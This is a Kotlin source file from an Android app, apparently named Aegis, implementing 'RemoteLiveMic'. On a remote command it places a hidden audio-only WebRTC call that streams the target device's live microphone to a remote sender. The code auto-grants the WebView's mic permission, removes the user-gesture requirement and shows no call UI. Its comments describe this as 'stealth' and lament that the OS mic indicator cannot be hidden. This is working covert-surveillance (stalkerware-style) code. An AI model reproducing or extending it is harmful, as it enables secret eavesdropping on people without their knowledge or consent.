package app.aether.aegis.remote

import app.aether.aegis.AegisApp
import app.aether.aegis.call.CallManager
import app.aether.aegis.call.CallState
import app.aether.aegis.call.CallStore
import android.annotation.SuppressLint
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.WebChromeClient
import android.webkit.WebView
import androidx.webkit.WebViewAssetLoader
import androidx.webkit.WebViewClientCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.launch

/**
 * Audio-only sibling of [RemoteLiveCamera]. Stealth WebRTC call from
 * target → sender carrying mic audio only — no video track.
 *
 * Heavier than [RemoteAccessProtocol.KIND_LISTEN] (one-shot 10 s
 * recording) but live and continuous; for the "I need to hear what's
 * happening RIGHT NOW" scenario rather than the "capture a sample"
 * one. Same watchdog + CallStore observer as the video path so a
 * sender that never answers (or a JS crash) tears the WebView and
 * mic capture down within CONNECT_TIMEOUT_MS.
 *
 * Stealth caveats identical to LIVE_CAM: on Android 12+ the OS mic
 * indicator (orange dot) is visible while capture is live — there is
 * no API to suppress it.
 */
object RemoteLiveMic {

    private const val TAG = "RemoteLiveMic"

    // The capture WebView and its bookkeeping are touched from both the
    // main thread (post blocks) and arbitrary caller threads (start/stop/
    // isStreaming), so the shared flags are @Volatile for visibility.
    @Volatile private var webView: WebView? = null
    @Volatile private var streaming = false
    @Volatile private var currentSender: String? = null
    // WebView is main-thread-only; every touch of it goes through this.
    private val main = Handler(Looper.getMainLooper())
    // SupervisorJob so a failing watchdog doesn't cancel the call observer
    // (and vice-versa) — each teardown path must survive the other failing.
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var watchdog: Job? = null
    private var callObserver: Job? = null

    // Single-shot connect deadline. If the sender never answers (or the JS
    // never reaches Connected) within this window, tear everything down so
    // the mic doesn't stay hot indefinitely. 60 s is generous for a stealth
    // call that may need the sender to wake and accept.
    private const val CONNECT_TIMEOUT_MS = 60_000L

    /**
     * Spin up a stealth audio-only WebRTC call from this (target) device to
     * [senderPubkey]. Idempotent: a second call while already streaming is a
     * no-op so a duplicate remote command can't stack two captures.
     *
     * The whole WebView setup runs on [main] because WebView is main-thread-
     * only; on any setup failure the streaming flags are rolled back so a
     * later retry isn't blocked by a half-open state.
     */
    @SuppressLint("SetJavaScriptEnabled")
    fun start(senderPubkey: String, senderDisplayName: String) {
        if (streaming) {
            Log.i(TAG, "start: already streaming, ignoring")
            return
        }
        streaming = true
        currentSender = senderPubkey
        val ctx = AegisApp.instance
        main.post {
            runCatching {
                // Serve the bundled call HTML/JS from app assets over an
                // https://appassets.androidplatform.net origin so getUserMedia
                // runs in a secure context (WebRTC refuses insecure origins).
                val assetLoader = WebViewAssetLoader.Builder()
                    .addPathHandler(
                        "/assets/",
                        WebViewAssetLoader.AssetsPathHandler(ctx),
                    )
                    .build()
                val wv = WebView(ctx).apply {
                    webViewClient = object : WebViewClientCompat() {
                        override fun shouldInterceptRequest(
                            view: WebView,
                            request: android.webkit.WebResourceRequest,
                        ) = assetLoader.shouldInterceptRequest(request.url)

                        // Signal the JS bridge once the page is ready so the
                        // native side can hand it the call parameters.
                        override fun onPageFinished(view: WebView, url: String?) {
                            CallManager.onPageLoaded()
                        }
                    }
                    webChromeClient = object : WebChromeClient() {
                        // Auto-grant the WebView's getUserMedia request. This
                        // only covers the WebView layer; the Android RUNTIME
                        // mic grant must already be held or capture still fails.
                        override fun onPermissionRequest(
                            req: android.webkit.PermissionRequest,
                        ) {
                            req.grant(req.resources)
                        }
                    }
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    // Let the call JS start audio without a user gesture — there
                    // is no UI on a stealth call for the user to tap.
                    settings.mediaPlaybackRequiresUserGesture = false
                }
                webView = wv
                CallManager.attachWebView(wv)
                // video=false: audio-only call. Same stealth semantics
                // as the video path — outgoing call placed without any
                // visible chat-row, CallIsland, or other surface tip.
                CallManager.placeCall(
                    peer = senderPubkey,
                    name = senderDisplayName,
                    video = false,
                    stealth = true,
                )
                wv.loadUrl(
                    "https://appassets.androidplatform.net/assets/www/android/call.html"
                )
                armWatchdog()
                armCallObserver()
                Log.i(TAG, "live-mic stream attached for sender=$senderDisplayName")
            }.onFailure {
                // Roll back so a future start() isn't blocked by the
                // `if (streaming) return` guard on a half-open attempt.
                Log.w(TAG, "live-mic attach failed", it)
                streaming = false
                currentSender = null
                webView = null
            }
        }
    }

    /**
     * Tear down the live mic: hang up, detach + destroy the WebView, and
     * cancel both watchdog and observer. Idempotent — safe to call from the
     * watchdog, the observer, or an explicit remote stop without double-free.
     * The WebView destroy is posted to [main] for the same thread rule.
     */
    fun stop() {
        if (!streaming) return
        // Flip the flag first so the call-observer's null-transition branch
        // sees streaming=false and doesn't recurse back into stop().
        streaming = false
        currentSender = null
        watchdog?.cancel(); watchdog = null
        callObserver?.cancel(); callObserver = null
        main.post {
            runCatching { CallManager.hangUp() }
            // destroyWebView() nulls CallManager.webView AND destroys the
            // Chromium renderer. The old code called detachWebView() + manual
            // destroy, which left CallManager.webView pointing at a DESTROYED
            // instance — the next normal call reused the dead WebView and got
            // no video / no JS / hung at WaitCapabilities. (Fixes #36)
            runCatching { CallManager.destroyWebView() }
            webView = null
            Log.i(TAG, "live-mic stream torn down")
        }
    }

    /** True while a capture is live — lets the remote layer reject a
     *  duplicate start and reflect state in command replies. */
    fun isStreaming(): Boolean = streaming
    /** Pubkey of the sender currently being streamed to, or null. */
    fun senderKey(): String? = currentSender

    /**
     * Single-shot connect deadline. If the call hasn't reached
     * [CallState.Connected] by [CONNECT_TIMEOUT_MS], assume the sender
     * never answered (or the JS died) and tear down so the mic can't stay
     * hot waiting on a call that will never connect.
     */
    private fun armWatchdog() {
        watchdog?.cancel()
        watchdog = scope.launch {
            kotlinx.coroutines.delay(CONNECT_TIMEOUT_MS)
            val active = CallStore.active.value
            if (active?.state != CallState.Connected) {
                Log.w(TAG, "watchdog: call never connected within ${CONNECT_TIMEOUT_MS}ms — tearing down")
                stop()
            }
        }
    }

    /**
     * Mirror the call lifecycle: once we've SEEN an active call, a later
     * transition back to null means the call ended (peer hung up, error,
     * etc.) — so tear the mic down. The [seenActive] latch is required
     * because [CallStore.active] starts null; without it the very first
     * null emission would tear down before the call ever begins.
     */
    private fun armCallObserver() {
        callObserver?.cancel()
        var seenActive = false
        callObserver = CallStore.active
            .onEach { active ->
                if (active != null) {
                    seenActive = true
                } else if (seenActive && streaming) {
                    Log.i(TAG, "CallStore.active went null — tearing down live-mic")
                    stop()
                }
            }
            .launchIn(scope)
    }
}
